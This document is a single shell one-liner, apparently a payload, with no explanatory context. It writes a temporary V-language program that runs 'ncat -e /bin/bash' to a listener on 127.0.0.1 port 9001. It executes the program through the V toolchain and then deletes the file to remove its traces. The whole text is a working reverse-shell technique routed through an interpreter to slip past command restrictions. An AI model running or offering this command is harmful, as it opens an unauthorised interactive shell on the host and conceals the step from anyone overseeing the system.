echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("ncat -e /bin/bash 127.0.0.1 9001 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v